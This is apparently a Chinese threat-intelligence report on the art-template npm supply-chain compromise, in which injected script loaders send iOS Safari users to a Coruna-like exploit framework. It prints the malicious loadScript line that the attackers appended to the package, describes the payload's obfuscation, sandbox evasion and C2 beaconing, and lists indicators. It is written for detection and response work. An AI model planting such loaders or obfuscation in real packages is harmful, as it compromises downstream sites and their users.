---
title: 疑似Coruna卷土重来：npm包art-template遭供应链攻击沦为iOS漏洞投送工具
url: https://mp.weixin.qq.com/s/qFXVV3_oZ51SPghQZ9hHVg
source: Doonsec's feed
date: 2026-05-21
fetch_date: 2026-05-22T06:04:40.116401
---

# 疑似Coruna卷土重来：npm包art-template遭供应链攻击沦为iOS漏洞投送工具

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/odcL3w4qOqibicDrCCTeuB52iarqgUPlG7h7ulPKhxaBhl2bX7CupXhkHFa2k2mZCaKBq9J33FIh6BzZh7kKzhFIzibZNk9bLZUXSWfDzicHNxWA/0?wx_fmt=jpeg)

# 疑似Coruna卷土重来：npm包art-template遭供应链攻击沦为iOS漏洞投送工具

原创

威胁情报中心
威胁情报中心

奇安信威胁情报中心

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

## 事件概述

奇安信威胁情报中心监测到2026年5月20日Socket威胁研究团队披露一起针对JavaScript生态系统的严重供应链投毒事件。攻击者通过伪装成“接手维护”的方式获取开源项目art-template的控制权，随后在其4.13.5和4.13.6版本中植入恶意代码。该恶意代码在被下游应用调用时，会在用户浏览器中注入远程脚本加载器，将iOS Safari用户重定向至包含类似Coruna漏洞利用框架的水坑站点。这一事件标志着供应链投毒与高级浏览器漏洞利用框架的深度融合，对全球前端生态与 iOS 用户构成严重威胁。

此次攻击的核心目标群体为运行iOS 11.0至17.2版本的Safari用户，主要集中在iOS 16.6至17.2区间，该范围覆盖了全球范围内尚未自动更新的iPhone用户主体。攻击者采用了反机器人指纹识别、WebAssembly工作量证明验证、JIT编译机器代码读取等手段，以确保漏洞利用载荷仅在存在可利用路径的目标设备上触发。

## 攻击链分析

### 供应链攻陷

攻击者并非采用传统的 Typosquatting（拼写仿冒），而是通过**维护权接管（Maintainer Takeover）**获取了 `art-template` 的发布权限。这个开源模板库的原作者表示，“之前有人以负责项目维护为借口获得了该项目，但很快他们就发布了一个包含外部脚本的包，并删除了相关的问题记录。”

攻击者迅速清理引入恶意代码后原仓库的 Issue 报告以压制安全社区发现，并采用渐进式混淆策略验证投放稳定性：

* **v4.13.3**：使用 `String.fromCharCode` 数组编码隐藏加载器，指向 `git.youzzjizz[.]com`，用于初期探针。
* **v4.13.5 / v4.13.6**：放弃编码，直接在 `lib/template-web.js` 的 Webpack 构建产物末尾注入明文 `loadScript()`，调用 `v3.jiathis[.]com` 域名下的脚本。版本间的“脱敏”行为表明攻击者已完成基础设施验证，进入规模化投递阶段。

### 恶意代码注入与水坑攻击

受感染的art-template包通过在`lib/template-web.js`文件中追加远程脚本加载代码实现恶意功能传播。当下游应用构建时引入该库，恶意代码会随合法代码一同被打包至生产环境。以下为4.13.6版本的注入代码：

```
loadScript('https://v3.jiathis[.]com/code/art.js')
```

任何使用受感染版本art-template的网站，都会在用户浏览器中注入一个`<script>`标签，导致任意攻击者控制的JavaScript代码在页面上下文中执行。这种注入方式使得攻击者能够实施Cookie/LocalStorage窃取、表单劫持、重定向攻击，以及进一步的有效载荷分发。

从art-template注入点到最终漏洞利用框架的完整攻击链如下：

```
pkg:npm/art-template@4.13.5 / @4.13.6
    ↓ lib/template-web.js注入loadScript()调用
hxxps://v3.jiathis[.]com/code/art.js
    ↓ HTTP重定向
hxxps://utaq[.]cfww[.]shop/gooll/gooll.html
    ↓ 嵌入脚本
hxxps://utaq[.]cfww[.]shop/gooll/49554fde7424c31c.js
    ↓ 水坑漏洞利用投递框架
C2门控后获取服务器端有效载荷
```

### 核心恶意代码

核心恶意载荷`49554fde7424c31c.js`（SHA-256: f31bdd069fe7966ae11be1f78ee5dd44445938856dd1df12379e0e84a6851f5c）本质上是一个高度模块化的浏览器漏洞投递框架，采用多重混淆，并具有严格的环境检测机制。

#### 混淆方式

载荷采用三层嵌套混淆：

* **第1层**：自定义字符串打包器。将字符串常量编码为32位无符号整数数组，每个整数以小端字节序打包两个UTF-16代码单元。字符串在运行时通过`unescape()`恢复。这种编码方式使得静态字符串扫描无法直接识别恶意关键字。
* **第2层**：Base64 编码的全局模块调度器，负责按需解密并执行后续逻辑。39900个字符的Base64 blob解码后生成29924个字符的JavaScript构造函数，直接以`new Function(atob("..."))()`方式执行。解码后的构造函数构建了名为`obChTK`的全局模块调度器，包含以SHA-1内容哈希为键、Base64编码模块体为值的JSON对象`MM`。
* **第3层**：字符串和整数常量XOR编码。敏感字符串会被编码成一个整数数组，该数组还需与一个针对每个字符串的密钥常量进行异或运算后生成。此外，数字常量以 32 位整数的 XOR 组合形式存储。

#### 环境检测

1. 针对特定iOS设备
   该框架明确仅针对Safari浏览器，操作系统限制为iOS，版本范围锁定为iOS 11.0至17.2。
   硬编码拒绝非 Safari 浏览器、非 iOS 设备及 iOS 17.3+ 版本。iOS 17.3 的阻断边界与已修复CVE的版本边界高度吻合，而非钓鱼工具的常规偏好。
    主要目标群体（iOS 16.6至17.2）覆盖了2022年9月至2023年12月发布的所有iOS版本，这一时间窗口内的设备构成了全球范围内未自动更新iPhone用户的核心群体。
2. 反沙箱机制
   结合无头浏览器检查、WebAssembly PoW 计算、网络时序探测及 CPU 架构识别，有效规避自动化扫描与云端沙箱分析
3. JIT 编译器内存布局探测
   攻击代码通过 `rvXShf` 偏移量（72, 16, 64, 88, 96 等精确字节）读取 WASM 函数编译后的机器码内存地址，并比对特定哈希值。该行为很可能与漏洞利用相关：在触发 JIT 内存破坏漏洞前，验证当前 JSC（JavaScriptCore）版本是否输出特定的易受攻击代码结构，确保漏洞利用成功率并避免在已修复环境中崩溃暴露。

#### C2通信

该框架每10秒向C2服务器`l1ewsu3yjkqeroy.xyz`发送关于受害目标的信标信息，包含以下数据：

* 用户公网IP地址
* iOS版本字符串
* 活动追踪标识符

外部情报显示，该域名于2026年5月14日注册，距攻击披露仅6天时间，使用Cloudflare DNS服务，关联威胁标签为"Generic Trojan"。C2服务器IP为172.67.141.14和104.21.40.254，均使用Cloudflare CDN服务进行基础设施隐藏。

#### 动态加载后续载荷

内容寻址远程模块加载器（`.lA()`）通过 C2 动态拉取最终攻击模块，该设计允许C2服务器按需分发不同的攻击模块，实现了“基础设施解耦”，即使前端载荷被捕获，核心漏洞利用代码仍可动态替换或更新。

## 攻击者分析

该攻击活动中的恶意代码针对 iOS Safari 的精准锁定、对 CPU 架构与 JIT 哈希的严格校验，以及丢弃非目标平台的行为，表明其追求**高价值目标的定向入侵**（如政要、记者、企业高管），而非广撒网式黑产盈利。攻击目标群体是未自动更新系统的 iOS 用户（16.6–17.2 占比极高）。

此次攻击在战术手法上与此前曝光的Coruna漏洞利用工具包高度相似

1. **投递机制相似性**：攻击链从npm供应链投毒到水坑重定向的结构，与已披露的Coruna活动模式一致。
2. **目标群体重叠**：框架对iOS Safari版本范围的精确筛选与Coruna历史活动的目标选择高度吻合。
3. **技术栈重叠**：WebAssembly工作量证明、JIT机器代码验证等高级检测机制与Coruna披露样本中的技术实现一致。
4. **基础设施模式**：域名命名模式和C2通信协议与已知的Coruna基础设施特征相符。

## 影响范围

此次攻击活动涉及开源前端库和iOS用户。首先是软件供应链风险。`art-template` 拥有数百万下游依赖。任何使用 `v4.13.5` 或 `v4.13.6` 的前端项目（包括企业级 SaaS、电商网站、管理后台）均可能成为无意识的水坑攻击节点。

其次对于全球未更新系统的iOS用户，攻击在浏览器上下文静默执行，无需用户交互。成功利用后可实现跨域 Cookie 窃取、本地存储遍历、表单注入劫持，并可能作为跳板部署移动端持久化间谍软件。

金融、政府、咨询、媒体及跨国企业等高频使用现代 Web 前端框架的行业面临最高风险。由于攻击载荷具备严格的平台门控，传统 WAF 基于签名或通用行为的规则极易被绕过，导致实际暴露面可能被严重低估。

## 检测与响应建议

1. **供应链隔离**：立即在 `package.json` / `yarn.lock` / `package-lock.json` 中锁定 `art-template` 至安全版本（<4.13.3 或官方修复版）。使用 `npm audit` 与 SAST 工具扫描依赖树。
2. **网络层阻断**：在 DNS 防火墙、WAF 及终端 EDR 中封禁相关 IOC 域名。针对 `jiathis.com` 的访问需结合 URL 路径（`/code/art.js`）进行精准拦截，避免误杀合法业务。

## 总结

此次针对npm包art-template的供应链投毒攻击活动中，攻击者通过获取开源项目维护权，在广泛使用的JavaScript模板库中植入恶意代码，利用下游应用的信任关系实现大规模目标覆盖。

核心漏洞利用框架展现了高度专业化的技术水平：指纹识别机制确保精准靶向，WebAssembly工作量证明有效阻止自动化分析，JIT机器代码验证技术表明攻击者掌握了针对特定iOS版本的高价值漏洞。这些技术特征与Coruna历史攻击活动高度一致，表明相关攻击团伙持续运营并迭代其攻击工具链。

对于依赖开源生态的组织和个人开发者而言，此次事件再次警示供应链安全的重要性。在享受开源便利的同时，必须建立完善的依赖审计、版本控制和行为监控机制，以应对日益复杂的网络安全威胁。

## IOC

### 域名

* `v3.jiathis[.]com` — 中间重定向域名（合法服务被滥用）
* `git.youzzjizz[.]com` — 早期版本C2域名
* `utaq[.]cfww[.]shop` — 水坑重定向域名
* `l1ewsu3yjkqeroy[.]xyz` — C2服务器域名
* `cfww[.]shop` — 域名注册商关联域名

### URL

* `hxxps://v3.jiathis[.]com/code/jia.js?uid=artemplate` — art-template 4.13.5注入目标
* `hxxps://v3.jiathis[.]com/code/art.js` — art-template 4.13.6注入目标
* `hxxps://utaq[.]cfww[.]shop/gooll/gooll.html` — 水坑页面
* `hxxps://utaq[.]cfww[.]shop/gooll/49554fde7424c31c.js` — 核心漏洞利用框架

### 文件哈希

f31bdd069fe7966ae11be1f78ee5dd44445938856dd1df12379e0e84a6851f5c (49554fde7424c31c.js)

### 受感染npm包版本

* `pkg:npm/art-template@4.13.3`
* `pkg:npm/art-template@4.13.5`
* `pkg:npm/art-template@4.13.6`

##

## 参考链接

1. https://socket.dev/blog/coruna-respawned-compromised-art-template-npm-package
2. https://safedep.io/art-template-npm-supply-chain-compromise/

预览时标签不可点

阅读原文

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/2AqAgxkehic9reynyobeEoOxwxOBrYrdjpuwE9eRaLTgBEVEuichLmtKsGusaxticjIQZGPZhCtODWekJxj0Zqscw/0?wx_fmt=png)

奇安信威胁情报中心

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/2AqAgxkehic9reynyobeEoOxwxOBrYrdjpuwE9eRaLTgBEVEuichLmtKsGusaxticjIQZGPZhCtODWekJxj0Zqscw/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过